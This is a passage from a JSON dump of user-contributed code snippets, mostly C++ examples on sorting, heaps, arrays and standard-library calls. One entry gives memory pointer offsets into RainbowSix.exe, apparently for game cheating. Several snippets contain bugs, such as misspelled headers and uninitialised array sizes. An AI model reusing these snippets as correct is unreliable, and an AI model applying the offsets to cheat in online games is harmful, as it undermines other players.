merged_a_b;  }\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3083,
    "keyword": null,
    "link": null,
    "title": " merge sort c++ vector",
    "description": "#include \"tools.hpp\" /*   >>>>>>>> (Recursive function that sorts a sequence of) <<<<<<<<<<<<       >>>>>>>> (numbers in ascending order using the merge function) <<<<                                 */ std::vector<int> sort(size_t start, size_t length, const std::vector<int>& vec) { \tif(vec.size()==0 ||vec.size() == 1) \treturn vec;  \tvector<int> left,right; //===>  creating left and right vectors   \tsize_t mid_point = vec.size()/2; //===>   midle point between the left vector and the right vector   \tfor(int i = 0 ; i < mid_point; ++i){left.emplace_back(vec[i]);} //===>  left vector  \tfor(int j = mid_point; j < length; ++j){ right.emplace_back(vec[j]);} //===>  right vector   \tleft = sort(start,mid_point,left); //===>  sorting the left vector  \tright = sort(mid_point,length-mid_point,right);//===>  sorting the right vector  \t  \treturn merge(left,right); //===>   all the function merge to merge between the left and the right } /*  >>>>> (function that merges two sorted vectors of numberss) <<<<<<<<<                                    */  vector<int> merge(const vector<int>& a, const vector<int>& b) { \tvector<int> merged_a_b(a.size()+b.size(),0); // temp vector that includes both left and right vectors \tint i = 0; \tint j = 0; \tint k = 0; \tint left_size = a.size(); \tint right_size = b.size(); \twhile(i<left_size && j<right_size)  \t{ \t\tif(a[i]<b[j]) \t\t{ \t\t\tmerged_a_b[k]=a[i]; \t\t\ti++; \t\t} \t\telse \t\t{ \t\t\tmerged_a_b[k]=b[j]; \t\t\tj++; \t\t} \t\tk++; \t} \twhile(i<left_size) \t{ \t\tmerged_a_b[k]=a[i]; \t\ti++; \t\tk++; \t} \twhile(j<right_size) \t{ \t\tmerged_a_b[k]=b[j]; \t\tj++; \t\tk++; \t} \t \treturn merged_a_b;  }\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3084,
    "keyword": null,
    "link": null,
    "title": " merge two sorted linked lists",
    "description": "// Complete soultion by me //I will request to try this on your own first #include<iostream> using namespace std; struct node {   int data;   node* next; }; node* head=NULL; node * head1=NULL; node* headbed=NULL; void insertion(node **head2 ,int key) {   node * temp=new node;   temp->data=key;   temp->next=NULL;   if(*head2==NULL)   {     *head2=temp;   }   else   {     node * ptr=*head2;     while(ptr->next!=NULL)     {       ptr=ptr->next;     }     ptr->next=temp;   } } void merge() {   node *ptr=head;   node * str=head1;   while(ptr!=NULL&&str!=NULL)   {     if((ptr->data)<(str->data))     {       insertion(&headbed,ptr->data);       ptr=ptr->next;     }     else     {       insertion(&headbed,(str->data));       str=str->next;     }   }   while(ptr!=NULL)   {     insertion(&headbed,ptr->data);       ptr=ptr->next;   }   while(str!=NULL)   {     insertion(&headbed,str->data);     str=str->next;   } } void print(node *heads) {   node* temp=heads;   while(temp!=NULL)   {     cout<<temp->data<<\"->\";     temp=temp->next;   }   cout<<\"NULL\"; } int main() {   int n;   cin>>n;   int value;   for(int i=0;i<n;i++)   {    cin>>value;     insertion(&head,value);   }   int n2;   cin>>n2;   for(int i=0;i<n2;i++)   {     cin>>value;     insertion(&head1,value);   }   merge();   print(headbed);   return 0; } \n Merge_Sort(head_reference)  STEP 1: If head is NULL or there is only one element in the Linked List      then return the Linked List      STEP 2: Divide the linked list into two equal halves.         Split_Linked_List(head, &first_half, &second_half);        STEP 3: Sort the two halves first_half and second_half.       MergeSort(first_half);       MergeSort(second_half);        STEP 4: Merge the sorted first_half and second_half (using Merge_Sort() recursively)     and update the head pointer using head_reference.      *head_reference = Merge_Sort(first_half, second_half); \n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3085,
    "keyword": null,
    "link": null,
    "title": " meter espacios en cadena c",
    "description": "cambiar %s por %[^\\n] y funcionar&aacute;n los espacios  Ejemplo:  char variable[50]; printf(\"Ingresa el valor:\\n\"); scanf(\"%[^\\n]\", variable); \n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3086,
    "keyword": null,
    "link": null,
    "title": " method",
    "description": "StdBank_Ltn_EcosystemNoSharing.getHierarchyMembers(groupNumber, currencyCode);to bring up all clients that have same relationship groupnumber  to show on the UI under Known Banked Clients Table \npublic void inflate(double amount)\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3087,
    "keyword": null,
    "link": null,
    "title": " microsoft flight simulator",
    "description": "Turns your computer into a space heater.\nYour gpu will spin so fast, it adds to the flying experience.\nIf you love your pc please don't play this \npublic PC microsoftFlightSimulator(PC your_pc){ \tyour_pc.destroy();     Person you = your_pc.getOwner();     you.greatestRegrets.add(\"buying MS Flight Simulator\");     return your_pc; }\nYour computer will perish at the hands of this game, I played 4k I know.\nUnable to download with recommended specs 5 stars\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3088,
    "keyword": null,
    "link": null,
    "title": " migration meaning",
    "description": "Migration is the movement of people from one place to another in search of better shelter or greener pastures\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3089,
    "keyword": null,
    "link": null,
    "title": " min array c++",
    "description": "//Syntax *min_element(ForwardIt first, ForwardIt last) *min_element(ForwardIt first, ForwardIt last, Compare comp) //Example: #include <bits/stdc++.h> using namespace std;  main() {     vector<int> v{ 3, 1, -14, 6, 5, 9 };      int result;          result = *min_element(v.begin(), v.end());     cout << \"min element is: \" << result << '\\n'; //-14       result = *min_element(v.begin(), v.end(), [](int a, int b) { return abs(a)<abs(b); });     cout << \"min element (absolute) is: \" << result << '\\n'; //1 }\n",
    "reg_date": "2021-10-12T11:42:09.000Z"
  },
  {
    "id": 3090,
    "keyword": null,
    "link": null,
    "title": " min element in stl c++",
    "description": "#include <bits/stdc++.h> using namespace std; int main() {   \tvector<int> v{ 9, 4, 7, 2, 5, 10, 11, 12, 1, 3, 6 }; \tint c = *min_element(v.begin(), v.end());        cout<<\"Min Element of the vector is \"<< c;     return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3091,
    "keyword": null,
    "link": null,
    "title": " min function in c++",
    "description": "#include <iostream> #include <algorithm> using namespace std; int main() {     int a = 5;     int b = 7;     cout << std::min(a, b) << \"\\n\";        // Returns the first one if both the numbers     // are same     cout << std::min(7, 7);        return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3092,
    "keyword": null,
    "link": null,
    "title": " min heap and max heap using priority queue",
    "description": "#include <bits/stdc++.h> #define cl cout << endl; using namespace std; int main() {     priority_queue<int, vector<int>,greater<int>> pqm; //min heap     priority_queue<int, vector<int>> pq;  //max heap     vector<int> v = {100, 2, 89, 36, 42, 91, 555};      for (int i = 0; i < v.size(); i++)     {          pq.push(v[i]);         pqm.push(v[i]);                   // pq.push(temp);     }          cout<<\"max heap is: \";         cl          while (!pq.empty())         {             int temp = pq.top();             pq.pop();             cout << temp << endl;         }          cout<<\"min heap is: \";         cl          while (!pqm.empty())         {             int temp = pqm.top();             pqm.pop();             cout << temp << endl;         }      return 0; }\n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \nint arr[]={1,2,1,3,3,5,7};         PriorityQueue<Integer> a=new PriorityQueue<>();         for(int i:arr){             a.add(i);         }         while(!a.isEmpty())             System.out.println(a.poll());\n//Sol1 PriorityQueue<Integer> queue = new PriorityQueue<>(10, Collections.reverseOrder());   //Sol2 // PriorityQueue<Integer> pq = new PriorityQueue<>((x, y) -> y - x); PriorityQueue<Integer> pq =new PriorityQueue<>((x, y) -> Integer.compare(y, x));   //Sol3 PriorityQueue<Integer> pq = new PriorityQueue<Integer>(defaultSize, new Comparator<Integer>() {     public int compare(Integer lhs, Integer rhs) {         if (lhs < rhs) return +1;         if (lhs.equals(rhs)) return 0;         return -1;     } });\n#include <bits/stdc++.h> using namespace std;   // User defined class, Point class Point {    int x;    int y; public:    Point(int _x, int _y)    {       x = _x;       y = _y;    }    int getX() const { return x; }    int getY() const { return y; } };   // To compare two points class myComparator { public:     int operator() (const Point& p1, const Point& p2)     {         return p1.getX() > p2.getX();     } };   // Driver code int main () {     // Creates a Min heap of points (order by x coordinate)     priority_queue <Point, vector<Point>, myComparator > pq;       // Insert points into the min heap     pq.push(Point(10, 2));     pq.push(Point(2, 1));     pq.push(Point(1, 5));       // One by one extract items from min heap     while (pq.empty() == false)     {         Point p = pq.top();         cout << \"(\" << p.getX() << \", \" << p.getY() << \")\";         cout << endl;         pq.pop();     }       return 0; }\n#include <bits/stdc++.h> using namespace std;    int main () {         priority_queue <int> pq;     pq.push(5);     pq.push(1);     pq.push(10);     pq.push(30);     pq.push(20);           while (pq.empty() == false)     {         cout << pq.top() << \" \";         pq.pop();     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3093,
    "keyword": null,
    "link": null,
    "title": " min heap cpp",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\npriority_queue <int> maxHeap; \n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \npriority_queue <int, vector<int>, greater<int> > pq;\n#include <iostream> using namespace std; void max_heap(int *a, int m, int n) {    int j, t;    t = a[m];    j = 2 * m;    while (j <= n) {       if (j < n && a[j+1] > a[j])          j = j + 1;       if (t > a[j])          break;       else if (t <= a[j]) {          a[j / 2] = a[j];          j = 2 * j;       }    }    a[j/2] = t;    return; } void build_maxheap(int *a,int n) {    int k;    for(k = n/2; k >= 1; k--) {       max_heap(a,k,n);    } } int main() {    int n, i;    cout<<\"enter no of elements of array\\n\";    cin>>n;    int a[30];    for (i = 1; i <= n; i++) {       cout<<\"enter elements\"<<\" \"<<(i)<<endl;       cin>>a[i];    }    build_maxheap(a,n);    cout<<\"Max Heap\\n\";    for (i = 1; i <= n; i++) {       cout<<a[i]<<endl;    } }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3094,
    "keyword": null,
    "link": null,
    "title": " min heap in c++",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\npriority_queue <int> maxHeap; \n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \n// C++ program to show that priority_queue is by  // default a Max Heap  #include <bits/stdc++.h>  using namespace std;   // Driver code  int main ()  {  \t// Creates a max heap  \tpriority_queue <int> pq;  \tpq.push(5);  \tpq.push(1);  \tpq.push(10);  \tpq.push(30);  \tpq.push(20);   \t// One by one extract items from max heap  \twhile (pq.empty() == false)  \t{  \t\tcout << pq.top() << \" \";  \t\tpq.pop();  \t}   \treturn 0;  }  \npriority_queue <int, vector<int>, greater<int> > pq;\npriority_queue<int, vector<int>, greater<int>> minHeap;\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3095,
    "keyword": null,
    "link": null,
    "title": " min heap priority queue c++",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \nThis is frequently used in Competitive Programming. We first multiply all elements with (-1). Then we create a max heap (max heap is the default for priority queue).  When we access the data and want to print it we simply multiply those elements with (-1) again.\nint arr[]={1,2,1,3,3,5,7};         PriorityQueue<Integer> a=new PriorityQueue<>();         for(int i:arr){             a.add(i);         }         while(!a.isEmpty())             System.out.println(a.poll());\n#include <bits/stdc++.h> using namespace std;   // User defined class, Point class Point {    int x;    int y; public:    Point(int _x, int _y)    {       x = _x;       y = _y;    }    int getX() const { return x; }    int getY() const { return y; } };   // To compare two points class myComparator { public:     int operator() (const Point& p1, const Point& p2)     {         return p1.getX() > p2.getX();     } };   // Driver code int main () {     // Creates a Min heap of points (order by x coordinate)     priority_queue <Point, vector<Point>, myComparator > pq;       // Insert points into the min heap     pq.push(Point(10, 2));     pq.push(Point(2, 1));     pq.push(Point(1, 5));       // One by one extract items from min heap     while (pq.empty() == false)     {         Point p = pq.top();         cout << \"(\" << p.getX() << \", \" << p.getY() << \")\";         cout << endl;         pq.pop();     }       return 0; }\n#include <bits/stdc++.h> using namespace std;    int main () {         priority_queue <int> pq;     pq.push(5);     pq.push(1);     pq.push(10);     pq.push(30);     pq.push(20);           while (pq.empty() == false)     {         cout << pq.top() << \" \";         pq.pop();     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3096,
    "keyword": null,
    "link": null,
    "title": " min heap stl",
    "description": "priority_queue <int, vector<int>, greater<int>> minHeap;\n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \n// C++ program to show that priority_queue is by  // default a Max Heap  #include <bits/stdc++.h>  using namespace std;   // Driver code  int main ()  {  \t// Creates a max heap  \tpriority_queue <int> pq;  \tpq.push(5);  \tpq.push(1);  \tpq.push(10);  \tpq.push(30);  \tpq.push(20);   \t// One by one extract items from max heap  \twhile (pq.empty() == false)  \t{  \t\tcout << pq.top() << \" \";  \t\tpq.pop();  \t}   \treturn 0;  }  \npriority_queue <int, vector<int>, greater<int> > pq;\npriority_queue<int, vector<int>, greater<int>> minHeap;\n#include <bits/stdc++.h> using namespace std;    int main () {         priority_queue <int> pq;     pq.push(5);     pq.push(1);     pq.push(10);     pq.push(30);     pq.push(20);           while (pq.empty() == false)     {         cout << pq.top() << \" \";         pq.pop();     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3097,
    "keyword": null,
    "link": null,
    "title": " min priority queue C++",
    "description": "priority_queue <int, vector<int>, greater<int>> g ;\npriority_queue <int, vector<int>, greater<int>> minHeap;\n#include<queue> std::priority_queue <int, std::vector<int>, std::greater<int> > minHeap; \n#include <bits/stdc++.h> using namespace std;    int main () {         priority_queue <int> pq;     pq.push(5);     pq.push(1);     pq.push(10);     pq.push(30);     pq.push(20);           while (pq.empty() == false)     {         cout << pq.top() << \" \";         pq.pop();     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3098,
    "keyword": null,
    "link": null,
    "title": " mingw no admin",
    "description": "// just use cygwin because you can install it without admin  // to do these follow the instructions  /*   1.Download cygwin from this site https://cygwin.com/install.html   2. go in the comand prromt   3. cd to the folder where setup-x86_64.exe  is   4. type setup-x86_64.exe --no-admin   5. now install these packages:   \t        gcc-g++             make             gdb                                          6. now use any ide ( I use clion )       7.DONE!!  (:         */   \n",
    "reg_date": "2021-10-12T11:42:10.000Z"
  },
  {
    "id": 3099,
    "keyword": null,
    "link": null,
    "title": " minimum coin change problem",
    "description": " #include<bits/stdc++.h> using namespace std; bool cmp(int a,int b) {     return(a>b); } int main() {     int n;     cin>>n;     int coin_type[n];     for(int i=0;i<n;i++)     {         cin>>coin_type[i];     }     sort(coin_type,coin_type+n,cmp);     int amount;     cin>>amount;     int i=0;     int count=0;     while(amount>0)     {         if(coin_type[i]<=amount)         {             count++;             amount=amount-coin_type[i];         }         else         {             i++;         }     }     cout<<count<<endl;     return 0; } \nclass Main {     // Function to find the minimum number of coins required     // to get total of N from set S     public static int findMinCoins(int[] S, int N)     {         // T[i] stores minimum number of coins needed to get total of i         int[] T = new int[N + 1];           for (int i = 1; i <= N; i++)         {             // initialize minimum number of coins needed to infinity             T[i] = Integer.MAX_VALUE;             int res = Integer.MAX_VALUE;               // do for each coin             for (int c: S)             {                 // check if index doesn't become negative by including                 // current coin c                 if (i - c >= 0) {                     res = T[i - c];                 }                   // if total can be reached by including current coin c,                 // update minimum number of coins needed T[i]                 if (res != Integer.MAX_VALUE) {                     T[i] = Integer.min(T[i], res + 1);                 }             }         }           // T[N] stores the minimum number of coins needed to get total of N         return T[N];     }       public static void main(String[] args)     {         // n coins of given denominations         int[] S = { 1, 2, 3, 4 };           // Total Change required         int N = 15;           int coins = findMinCoins(S, N);         if (coins != Integer.MAX_VALUE) {             System.out.print(\"Minimum number of coins required to get desired change is \"                 + coins);         }     } } \n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3100,
    "keyword": null,
    "link": null,
    "title": " minimum number of deletions to make a string palindrome",
    "description": "//Code by @soumyadeepp : Soumyadeep Ghosh  //A very Simple DP problem. Just find the length of the Longest common subsequence  //of the string and its reverse. Now subtract this length from the actual length //of the substring. That's it.  #include <bits/stdc++.h>  using namespace std;  int lps(string s) { \tstring r = s; \treverse(r.begin(),r.end()); \tint sz1 = s.size(); \tint dp[sz1+1][sz1+1]; \t \tfor(int i = 0 ; i <= sz1 ; i++) \t{ \t\tdp[0][i] = 0; \t\tdp[i][0] = 0; \t} \tfor(int i = 1; i <= sz1; i++) \t{ \t\tfor(int j = 1; j <= sz1 ; j++) \t\t{ \t\t\tif(s[i-1] == r[j-1]) \t\t\t{ \t\t\t\tdp[i][j] = dp[i-1][j-1] + 1; \t\t\t} \t\t\telse \t\t\tdp[i][j] = max(dp[i-1][j],dp[i][j-1]); \t\t} \t} \treturn dp[sz1][sz1]; } int main() { \tint t; \tcin>>t; \twhile(t--) \t{ \t\tstring s; \t\tcin>>s; \t\tint ans = s.size() - lps(s); \t\tcout<<ans<<endl; \t} }\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3101,
    "keyword": null,
    "link": null,
    "title": " minmax element c++",
    "description": "// minmax_element #include <iostream>     // std::cout #include <algorithm>    // std::minmax_element #include <array>        // std::array  int main () {   std::array<int,7> foo {3,7,2,9,5,8,6};    auto result = std::minmax_element (foo.begin(),foo.end());    // print result:   std::cout << \"min is \" << *result.first;   std::cout << \", at position \" << (result.first-foo.begin()) << '\\n';   std::cout << \"max is \" << *result.second;   std::cout << \", at position \" << (result.second-foo.begin()) << '\\n';    return 0; } \n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3102,
    "keyword": null,
    "link": null,
    "title": " mj",
    "description": "#include <iostream> using namespace std; int main () {   cout << \"Basketball player? (y/n): \";   char response;   cin >> response;   if (response == 'y') {     cout << \"Michael Jordan\" << endl;   } else {     cout << \"Musician? (y/n): \";     char response2;     cin >> response2;     if (response2 == 'y') {       cout << \"Michael Jackson\" << endl;     } else {       cout << \"Michael B. Jordan\" << endl;     }   }   return 0; }\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3103,
    "keyword": null,
    "link": null,
    "title": " mkdir boost filesystem",
    "description": "boost::filesystem::create_directory(path);\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3104,
    "keyword": null,
    "link": null,
    "title": " mkdir c++",
    "description": "#include <boost/filesystem.hpp>  namespace fs = boost::filesystem; fs::create_directory( fs::current_path() + mysubdirectoryname );\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3105,
    "keyword": null,
    "link": null,
    "title": " mm",
    "description": "Array (     [0] =>  ) \nPlease select a strategy and press Play. \n<article   id=\"electric-cars\"   data-columns=3   data-index-number=\"12314\"     data-parent=\"cars\"> ... </article>\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3106,
    "keyword": null,
    "link": null,
    "title": " modulo c++",
    "description": "if (iNum % 2 == 0)  { cout << num << \" is even \"; } // % is used to mod numbers \n#include <iostream> using namespace std;  int main() { \tcout << 11%3; // Prints 2 }\n// \tMode(%) => to get remainder \t1 % 10 = 1  \t2 % 10 = 2     10 % 10 = 0       \n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3107,
    "keyword": null,
    "link": null,
    "title": " modulo subtraction",
    "description": "((a%c - b%c) % c + c) % c \n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3108,
    "keyword": null,
    "link": null,
    "title": " monotonic deque",
    "description": "deque<int> dq; vector<int> ans; for (int i=0; i<nums.size(); i++) { if (!dq.empty() && dq.front() == i-k) dq.pop_front(); while (!dq.empty() && nums[dq.back()] < nums[i]) dq.pop_back(); dq.push_back(i); if (i>=k-1) ans.push_back(nums[dq.front()]); }\n",
    "reg_date": "2021-10-12T11:42:11.000Z"
  },
  {
    "id": 3109,
    "keyword": null,
    "link": null,
    "title": " move elements from vector to unordered set",
    "description": "#include <iostream> #include <vector> #include <unordered_set>   int main() {     std::vector<int> input({ 1, 2, 2, 1, 3, 1, 4 });       std::unordered_set<int> set(input.begin(), input.end());       for (const int &i: set) {         std::cout << i << \" \";     }       return 0; }\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3110,
    "keyword": null,
    "link": null,
    "title": " move letter position using c++ with input",
    "description": "#include <iostream>  using namespace std;  int main()  {     char c='x';     int position = 0; //starts from the left most position     int temp =0;     cout << \"*\" << endl;     cout << \"Enter: l (Move Left) or r (Move Right) or x (exit): \" << endl;     cin >> c;  while (c != 'x') {     if((c == 'r')||(c=='l'))     {         if(c == 'r')         {         position++;         }         else if(c == 'l')         {         if(position==0)              position=0;         else             position--;         }         temp=position;         while(temp--!=0)         {         cout << \" \"; //print space         }         cout << \"*\" <<endl;     }        else     {         cout << \"Wrong character entered\\n\" << endl;     }     cout << \"Enter: l (Move Left) or r (Move Right) or x (exit): \"<< endl;     cin >> c; } return 0;\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3111,
    "keyword": null,
    "link": null,
    "title": " move mouse c++",
    "description": "#include <Windows.h> int main() {   int x = 3; int y = 4;   SetCursorPos(x, y); //set cursor position   return 0; }\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3112,
    "keyword": null,
    "link": null,
    "title": " mpgh dbd",
    "description": "RainbowSix.exe + 0x06E9F8F8 ] + 0x58 ] + 0x158 ] + 0x38 ] + 0x50 ] + 0x0 ] + 0xB0 ] + 0x10 ] + 0x38 ] + 0x7C\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3113,
    "keyword": null,
    "link": null,
    "title": " mpi bcast",
    "description": "MPI_Bcast(void *data, int count, MPI_Datatype datatype, int root, \t\tMPI_Comm communicator)\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3114,
    "keyword": null,
    "link": null,
    "title": " mq-135 with arduino",
    "description": "// the setup routine runs once when you press reset: void setup() {   // initialize serial communication at 9600 bits per second:   Serial.begin(9600); }  // the loop routine runs over and over again forever: void loop() {   // read the input on analog pin 0:   int sensorValue = analogRead(A0);   // print out the value you read:   Serial.println(sensorValue);   delay(20); }\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3115,
    "keyword": null,
    "link": null,
    "title": " mql4 move stop loss",
    "description": "bool OrderModify(int ticket, double price, double stoploss, double takeprofit, datetime expiration, color arrow_color=CLR_NONE)\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3116,
    "keyword": null,
    "link": null,
    "title": " msdn parse command line",
    "description": "// Parsing_C_Commandline_args.c // ARGS.C illustrates the following variables used for accessing // command-line arguments and environment variables: // argc  argv  envp //  #include <stdio.h>  int main( int argc, // Number of strings in array argv char *argv[],      // Array of command-line argument strings char **envp )      // Array of environment variable strings {     int count;      // Display each command-line argument.     printf_s( \"\\nCommand-line arguments:\\n\" );     for( count = 0; count < argc; count++ )         printf_s( \"  argv[%d]   %s\\n\", count, argv[count] );      // Display each environment variable.     printf_s( \"\\nEnvironment variables:\\n\" );     while( *envp != NULL )         printf_s( \"  %s\\n\", *(envp++) );      return; } \n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3117,
    "keyword": null,
    "link": null,
    "title": " mt19937 example c++",
    "description": "#include <iostream> #include <random>  using namespace std;  int main() {     mt19937 mt_rand(time(0));      cout << mt_rand() << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:42:12.000Z"
  },
  {
    "id": 3118,
    "keyword": null,
    "link": null,
    "title": " multi initialisation if statement c++",
    "description": "// Only variables of the same type can be initialised in for-loop declaration for(int x = 10, y = 20, z = 50; x < 30; ++x, ++y, ++z) {   // Do something }\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3119,
    "keyword": null,
    "link": null,
    "title": " multi variable assignment cpp",
    "description": "int x = 5, y = 6, z = 50;\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3120,
    "keyword": null,
    "link": null,
    "title": " multidimensional array",
    "description": "// two dimensional string array in java example public class TwoDimensionalStringArray  {    public static void main(String[] args)     {       String[][] animals = {               { \"Lion\", \"Tiger\", \"Cheetah\" },               { \"Deer\", \"Jackal\", \"Bear\" },               { \"Hyena\", \"Fox\", \"Elephant\" } };       for(int a = 0; a < animals.length; a++)        {          System.out.print(animals[a][0] + \" \");          for(int b = 1; b < animals[a].length; b++)           {             System.out.print(animals[a][b] + \" \");          }          System.out.println();       }    } }\n// two dimensional array in java example program public class SimpleTwodimensionalArray {    public static void main(String[] args)     {       // declare and initialize two dimensional array       int[][] arrnumbers = {{2, 4},{6, 8},{10, 12}};          System.out.println(\"Two dimensional array in java: \");           for(int a = 0; a < 3; a++)        {          for(int b = 0; b < 2; b++)           {             System.out.println(arrnumbers[a][b]);          }       }    } }\n// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3\nvar iMax = 20; var jMax = 10; var f = new Array();  for (i=0;i<iMax;i++) {  f[i]=new Array();  for (j=0;j<jMax;j++) {   f[i][j]=0;  } } \nint disp[2][4] = { 10, 11, 12, 13, 14, 15, 16, 17};\nvar items = [   [1, 2],   [3, 4],   [5, 6] ]; console.log(items[0][0]); // 1 console.log(items[0][1]); // 2 console.log(items[1][0]); // 3 console.log(items[1][1]); // 4 console.log(items);\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3121,
    "keyword": null,
    "link": null,
    "title": " multidimensional array c++",
    "description": "// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \n#include <iostream> using namespace std; int main(){ \tint n,m; \tint a[n][m]; \tcin >> n >>m; \tfor ( int i=0; i<n; i++){ \t\tfor (int j=0; j<m; j++){ \t\t\tcin >> a[i][j]; \t\t} \t} \t \tfor ( int x=0; x<n; x++){ \t\tfor (int y=0; y<m; y++){ \t\t\tcout << \"a[\" << x << \"][\" << y << \"]: \"; \t\t\tcout << a[x][y] << endl; \t\t} \t} \treturn 0; }\n#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3; 9 10 void printMatrix(array<array<int, COLS>, ROWS> matrix){ 11 //for each row 12 for (int row = 0; row < matrix.size(); ++row){ 13 //for each element in the current row 14 for (int col = 0; col < matrix[row].size(); ++col){ 15 cout << matrix[row][col] << ' '; 16 } 17 cout << endl; 18 } 19 }\n\tint MyArray[2][3] = { {2, 3, 4}, {12, 13, 14} };  \t//visualize \t//2, 3, 4 \t//12, 13, 14  \tstd::cout << MyArray[0][2] << endl; // 4 \tstd::cout << MyArray[1][1] << endl; // 13  //First square bracket means how many rows you want in your array //Second squire bracket is for how many qulam you want in your array\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3122,
    "keyword": null,
    "link": null,
    "title": " multiline comment in C++",
    "description": "/* Multiline comments like this */  Statement out of multiline comment\n/* This is a comment */  /* C++ comments can also    * span multiple lines */  /* Meowwwwww */\n// This is a single one line comment  /* multiline comment */\nCtrl+Shift+/\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3123,
    "keyword": null,
    "link": null,
    "title": " multiline string  in c++",
    "description": "#include <iostream>   int main() {  \t \t//Display in Multiline using escape character /n \tconst char* example2 = \"Line1\\n\" \t\"Line2\\n\" \t\t\"Line3\\n\" \t\t\"Line4\\n\" \t\t; \tstd::cout << example2 << std::endl; \tstd::cout << \"===================================\" << std::endl; \t// display in multiline using Raw \tconst char* example = R\"(Line1 Line2 Line3  Line4  )\";//no need to use escape character  /n \tstd::cout << example << std::endl;  \tstd::cin.get(); } \n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3124,
    "keyword": null,
    "link": null,
    "title": " multiple inheritance in c++",
    "description": "#include<iostream>  using namespace std;   class A  {  public:  A() { cout << \"A's constructor called\" << endl; }  };   class B  {  public:  B() { cout << \"B's constructor called\" << endl; }  };   class C: public B, public A // Note the order  {  public:  C() { cout << \"C's constructor called\" << endl; }  };   int main()  {  \tC c;  \treturn 0;  } \nThe \"diamond problem\" (sometimes referred to as the \"Deadly Diamond of Death\") is an ambiguity that arises when two classes B and C inherit from A, and class D inherits from both B and C If there is a method in A that B and C have overridden, and D does not override it, then which class of the method does D inherit: that of B, or that of C?\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3125,
    "keyword": null,
    "link": null,
    "title": " multiple threads cpp",
    "description": "#include <iostream> #include <threads> #include <vecotr>  std::vector<std::thread*> threads;  for(int i = 0; i < x; i++) {   threads.push_back(new std::thread(func)); }\n",
    "reg_date": "2021-10-12T11:42:13.000Z"
  },
  {
    "id": 3126,
    "keyword": null,
    "link": null,
    "title": " multiple words C++ in same",
